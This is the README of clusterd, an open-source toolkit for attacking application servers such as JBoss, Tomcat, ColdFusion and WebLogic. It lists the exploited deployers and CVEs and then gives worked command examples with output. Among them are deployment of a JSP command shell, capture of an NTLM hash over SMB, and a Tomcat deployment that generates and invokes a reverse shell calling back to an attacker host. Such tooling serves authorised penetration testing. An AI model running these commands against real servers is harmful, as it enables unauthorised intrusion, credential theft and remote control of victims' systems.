clusterd
==

clusterd is an open source application server attack toolkit.  Born out of frustration with
current fingerprinting and exploitation methods, clusterd automates the fingerprinting,
reconnaissance, and exploitation phases of an application server attack.  See the wiki for more information. 

Requirements
----
* Python >= 2.7.x
* Requests >= 2.2.x

Installation
----
The recommended installation of clusterd is to clone the Github repository

    git clone https://github.com/hatRiot/clusterd.git

clusterd features
----
* clusterd currently supports six different application server platforms, with
  several more currently in development and research phases

* JBoss
    - Versions 3.x - 8.1 
    - Currently supported deployers:
        + /jmx-console/MainDeployer for 3.x, 4.x, and 6.x
        + /jmx-console/DeploymentFileRepository for 3.x, 4.x, and 5.x
        + /web-console/Invoker (MainDeployer) for 3.x, 4.x, and 6.x
        + /web-console/Invoker (BSHDeployer) for 3.x and 4.x
        + /invoker/JMXInvokerServlet for 3.x, 4.x, and 5.x
        + /invoker/EJBInvokerServlet for 3.x, 4.x, and 5.x
        + /management for 7.x, 8.x
        + SEAM2 for 5.1, 6.x
    - Dump deployed WARs 
    - Fetch host OS information
    - Verb tampering vulnerability (CVE-2010-0738)
    - Credential/path disclosure (CVE-2005-2006)

* ColdFusion
    - Versions 5 - 11
    - Currently supported deployers:
        + Task Scheduler for 5.x, 6.x, 7.x, 8.x, 9.x, 10.x, and 11.x
        + FCKeditor for 8.x
        + LFI Log Injection 6.x, 7.x, and 8.x
    - Hash retrieval for versions 6 - 10
    - RDS admin bypass (CVE-2013-0632)
    - Pass the hash authentication for versions 7 - 9

* WebLogic
    - Versions 7, 8.1, 11, and 12
    - Deployer over T3 and T3S currently tested against 11.x and 12.x
    - Dump deployed WARs over T3/T3S
    - Fetch host OS information

* Tomcat
    - Versions 3.x - 8.x
    - Currently can deploy to all versions with an exposed manager interface
    - Dump deployed WARs
    - Fetch host OS information

* Railo 
    - Versions 3.x - 4.x
    - Currently supported deployers:
        + Task scheduler for 3.x and 4.x
        + Log injection for 3.x and 4.x
        + Thumbnail pre-auth RCE for 3.x and 4.x (up to 4.2.1)
    - Fetch host OS information
    - Pre-auth Password retrieval for 3.x - 4.2.1

* Axis2
    - Versions 1.4 - 1.6
    - Currently supported deployers:
        + Admin interface for 1.4, 1.5, and 1.6
    - Fetch host OS information
    - View deployed services
    - Credential disclosure for 1.4

* Glassfish
    - Versions 3.x - 4.x
    - View deployed services
    - Currently supported deployers:
        + Admin upload for 3.x and 4.x

* Simple API for adding new platforms, fingerprints, deployers, and exploits
* Various auxiliary modules for vulnerabilities and exploitation techniques

examples / usage
----
```
$ ./clusterd.py 

        clusterd/0.3.1 - clustered attack toolkit
            [Supporting 7 platforms]

usage: ./clusterd.py [options]

optional arguments:
  -h, --help            show this help message and exit

Connection:
  Options for configuring the connection

  -i [ip address]       Server address
  -iL [file]            Server list
  -p [port]             Server port
  --proxy [proxy://server:port]
                        Connect through proxy [http|https]
  --proxy-auth [username:password]
                        Proxy credentials
  --timeout [seconds]   Connection timeout [5s]
  --random-agent        Use a random User-Agent for requests
  --ssl                 Force SSL

Remote Host:
  Settings specific to the remote host

  -a [jboss|coldfusion|weblogic|tomcat|railo|axis2|glassfish]
                        Hint at remote host service
  -o [windows|linux]    Hint at remote host OS
  -v [version]          Specific version to test
  --usr-auth [username:password]
                        Login credentials for service
  --fingerprint         Fingerprint the remote system
  --arch [x86|x64]      Specify remote OS architecture

Deploy:
  Deployment flags and settings

  --deploy [file]       Deploy to the discovered service
  --undeploy [context]  Undeploy file from server
  --deployer [deployer]
                        Specify a deployer to use
  --invoke              Invoke payload after deployment
  --rand-payload        Use a random name for the deployed file
  -b [user]             Brute force credentials for user [admin]
  --wordlist [path]     Wordlist for brute forcing passwords

Other:
  Miscellaneous flags

  --deployer-list       List all available deployers
  --aux-list [platform]
                        List all available exploits
  --gen-payload [host:port] for reverse connection
                        Generate a reverse shell payload
  --discover [discovery_file]
                        Attempt to discover application servers using the
                        specified nmap gnmap output (use -sV when scanning)
  --listen [adapter]    Adapter to listen on when needed
  -d                    Enable debug output
  -l                    Log output to file [$time$_log.log]
```

jboss fingerprint and host info
```
$ ./clusterd.py -i 192.168.1.105 -a jboss --jb-info --random-agent

        clusterd/0.3 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-05-25 10:57PM] Started at 2014-05-25 10:57PM
 [2014-05-25 10:57PM] Servers' OS hinted at windows
 [2014-05-25 10:57PM] Fingerprinting host '192.168.1.105'
 [2014-05-25 10:57PM] Server hinted at 'jboss'
 [2014-05-25 10:57PM] Checking jboss version 3.2 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 3.2 JBoss Web Console...
 [2014-05-25 10:57PM] Checking jboss version 3.0 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 4.2 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 4.2 JBoss Web Console...
 [2014-05-25 10:57PM] Checking jboss version 4.0 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 4.0 JBoss Web Console...
 [2014-05-25 10:57PM] Checking jboss version 5.1 JBoss Web Manager...
 [2014-05-25 10:57PM] Checking jboss version 5.1 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 5.1 JBoss Web Console...
 [2014-05-25 10:57PM] Checking jboss version 5.0 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 5.0 JBoss Web Console...
 [2014-05-25 10:57PM] Checking jboss version 6.0 JBoss Web Manager...
 [2014-05-25 10:57PM] Checking jboss version 6.1 JBoss Web Manager...
 [2014-05-25 10:57PM] Checking jboss version 6.1 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 6.0 JBoss JMX Console...
 [2014-05-25 10:57PM] Checking jboss version 7.1 JBoss Management...
 [2014-05-25 10:57PM] Checking jboss version 7.0 JBoss Management...
 [2014-05-25 10:57PM] Checking jboss version 8.0 JBoss Management...
 [2014-05-25 10:57PM] Checking jboss version Any JBoss EJB Invoker Servlet...
 [2014-05-25 10:57PM] Checking jboss version Any JBoss HTTP Headers (Unreliable)...
 [2014-05-25 10:57PM] Checking jboss version Any JBoss JMX Invoker Servlet...
 [2014-05-25 10:57PM] Checking jboss version Any JBoss RMI Interface...
 [2014-05-25 10:57PM] Checking jboss version Any JBoss Status Page...
 [2014-05-25 10:57PM] Matched 7 fingerprints for service jboss
 [2014-05-25 10:57PM]   JBoss JMX Console (version 5.0)
 [2014-05-25 10:57PM]   JBoss Web Console (version 5.0)
 [2014-05-25 10:57PM]   JBoss EJB Invoker Servlet (version Any)
 [2014-05-25 10:57PM]   JBoss HTTP Headers (Unreliable) (version 5.0)
 [2014-05-25 10:57PM]   JBoss JMX Invoker Servlet (version Any)
 [2014-05-25 10:57PM]   JBoss RMI Interface (version Any)
 [2014-05-25 10:57PM]   JBoss Status Page (version Any)
 [2014-05-25 10:57PM] Fingerprinting completed.
 [2014-05-25 10:57PM] Attempting to retrieve JBoss info...
 [2014-05-25 10:57PM]   ActiveThreadCount: 68    
 [2014-05-25 10:57PM]   AvailableProcessors: 1    
 [2014-05-25 10:57PM]   OSArch: amd64    
 [2014-05-25 10:57PM]   MaxMemory: 518979584    
 [2014-05-25 10:57PM]   HostAddress: 192.168.1.105    
 [2014-05-25 10:57PM]   JavaVersion: 1.7.0_45    
 [2014-05-25 10:57PM]   OSVersion: 6.1    
 [2014-05-25 10:57PM]   TotalMemory: 286703616    
 [2014-05-25 10:57PM]   JavaVendor: Oracle Corporation    
 [2014-05-25 10:57PM]   ActiveThreadGroupCount: 9    
 [2014-05-25 10:57PM]   OSName: Windows 7    
 [2014-05-25 10:57PM]   FreeMemory: 122651808    
 [2014-05-25 10:57PM]   HostName: bryan-PC    
 [2014-05-25 10:57PM]   JavaVMVersion: 24.45-b08    
 [2014-05-25 10:57PM]   JavaVMVendor: Oracle Corporation    
 [2014-05-25 10:57PM]   JavaVMName: Java HotSpot(TM) 64-Bit Server VM    
 [2014-05-25 10:57PM] Finished at 2014-05-25 10:57PM
```

jboss DFS deployment against JBoss 5.0
```
$ ./clusterd.py -i 192.168.1.105 -a jboss -v5.0 --deploy ./src/lib/resources/cmd.war --random-agent

        clusterd/0.3 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-05-25 11:00PM] Started at 2014-05-25 11:00PM
 [2014-05-25 11:00PM] Servers' OS hinted at windows
 [2014-05-25 11:00PM] Fingerprinting host '192.168.1.105'
 [2014-05-25 11:00PM] Server hinted at 'jboss'
 [2014-05-25 11:00PM] Checking jboss version 5.0 JBoss JMX Console...
 [2014-05-25 11:00PM] Checking jboss version 5.0 JBoss Web Console...
 [2014-05-25 11:00PM] Checking jboss version Any JBoss EJB Invoker Servlet...
 [2014-05-25 11:00PM] Checking jboss version Any JBoss HTTP Headers (Unreliable)...
 [2014-05-25 11:00PM] Checking jboss version Any JBoss JMX Invoker Servlet...
 [2014-05-25 11:00PM] Checking jboss version Any JBoss RMI Interface...
 [2014-05-25 11:00PM] Checking jboss version Any JBoss Status Page...
 [2014-05-25 11:00PM] Matched 7 fingerprints for service jboss
 [2014-05-25 11:00PM]   JBoss JMX Console (version 5.0)
 [2014-05-25 11:00PM]   JBoss Web Console (version 5.0)
 [2014-05-25 11:00PM]   JBoss EJB Invoker Servlet (version Any)
 [2014-05-25 11:00PM]   JBoss HTTP Headers (Unreliable) (version 5.0)
 [2014-05-25 11:00PM]   JBoss JMX Invoker Servlet (version Any)
 [2014-05-25 11:00PM]   JBoss RMI Interface (version Any)
 [2014-05-25 11:00PM]   JBoss Status Page (version Any)
 [2014-05-25 11:00PM] Fingerprinting completed.
 [2014-05-25 11:00PM] This deployer requires a JSP, default to cmd.jsp? [Y/n] > 
 [2014-05-25 11:00PM] Preparing to deploy cmd...
 [2014-05-25 11:00PM] Successfully deployed '/cmd/cmd.jsp'
 [2014-05-25 11:00PM] Finished at 2014-05-25 11:00PM
```

jboss UNC hash retrieval
```
$ sudo ./clusterd.py -i 192.168.1.105 -a jboss -v4.2 --random-agent --jb-smb

        clusterd/0.3 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-05-25 11:01PM] Started at 2014-05-25 11:01PM
 [2014-05-25 11:01PM] Servers' OS hinted at windows
 [2014-05-25 11:01PM] Fingerprinting host '192.168.1.105'
 [2014-05-25 11:01PM] Server hinted at 'jboss'
 [2014-05-25 11:01PM] Checking jboss version 4.2 JBoss JMX Console...
 [2014-05-25 11:01PM] Checking jboss version 4.2 JBoss Web Console...
 [2014-05-25 11:01PM] Checking jboss version Any JBoss EJB Invoker Servlet...
 [2014-05-25 11:01PM] Checking jboss version Any JBoss HTTP Headers (Unreliable)...
 [2014-05-25 11:01PM] Checking jboss version Any JBoss JMX Invoker Servlet...
 [2014-05-25 11:01PM] Checking jboss version Any JBoss RMI Interface...
 [2014-05-25 11:01PM] Checking jboss version Any JBoss Status Page...
 [2014-05-25 11:01PM] Matched 7 fingerprints for service jboss
 [2014-05-25 11:01PM]   JBoss JMX Console (version 4.2)
 [2014-05-25 11:01PM]   JBoss Web Console (version 4.2)
 [2014-05-25 11:01PM]   JBoss EJB Invoker Servlet (version Any)
 [2014-05-25 11:01PM]   JBoss HTTP Headers (Unreliable) (version 4.2)
 [2014-05-25 11:01PM]   JBoss JMX Invoker Servlet (version Any)
 [2014-05-25 11:01PM]   JBoss RMI Interface (version Any)
 [2014-05-25 11:01PM]   JBoss Status Page (version Any)
 [2014-05-25 11:01PM] Fingerprinting completed.
 [2014-05-25 11:01PM] Setting up SMB listener..
 [2014-05-25 11:01PM] Invoking UNC loader...
 [2014-05-25 11:01PM] bryan::bryan-PC:1122334455667788:34826253d353ebca4811bd08be0db067:01010000000000003dac35999f78cf019df7c49c7268a5f600000000020000000000000000000000
 [2014-05-25 11:01PM] Finished at 2014-05-25 11:01PM
```

tomcat deployment and reverse shell invocation
```
$ ./clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows

        clusterd/0.3 - clustered attack toolkit
            [Supporting 6 platforms]

 [2014-05-25 10:53PM] Started at 2014-05-25 10:53PM
 [2014-05-25 10:53PM] Generating payload....
 [2014-05-25 10:53PM] Payload generated (shell.war).  Payload: java/jsp_shell_reverse_tcp
 [2014-05-25 10:53PM] Servers' OS hinted at windows
 [2014-05-25 10:53PM] Fingerprinting host '192.168.1.105'
 [2014-05-25 10:53PM] Server hinted at 'tomcat'
 [2014-05-25 10:53PM] Checking tomcat version 5.5 Tomcat...
 [2014-05-25 10:53PM] Checking tomcat version 5.5 Tomcat Manager...
 [2014-05-25 10:53PM] Matched 2 fingerprints for service tomcat
 [2014-05-25 10:53PM]   Tomcat (version 5.5)
 [2014-05-25 10:53PM]   Tomcat Manager (version 5.5)
 [2014-05-25 10:53PM] Fingerprinting completed.
 [2014-05-25 10:53PM] Preparing to deploy /tmp/.clusterd/z1dgi.war...
 [2014-05-25 10:53PM] Deployed /tmp/.clusterd/z1dgi.war to /z1dgi
 [2014-05-25 10:53PM] z1dgi invoked at 192.168.1.105
 [2014-05-25 10:53PM] Finished at 2014-05-25 10:53PM
```
